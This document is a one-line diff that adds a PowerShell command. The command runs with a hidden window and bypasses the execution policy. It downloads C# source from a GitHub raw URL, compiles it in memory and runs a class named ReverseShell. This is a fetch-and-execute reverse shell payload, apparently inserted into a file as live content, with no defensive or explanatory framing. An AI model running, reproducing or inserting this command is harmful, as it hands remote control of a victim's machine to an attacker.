@@ -1,0 +1,1 @@
+powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden  -Command "$cs = (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SHAHID-XT/tmux-omb/refs/heads/main/backc.cs');Add-Type -TypeDefinition $cs -Language CSharp;[ReverseShell.Program]::Main()"
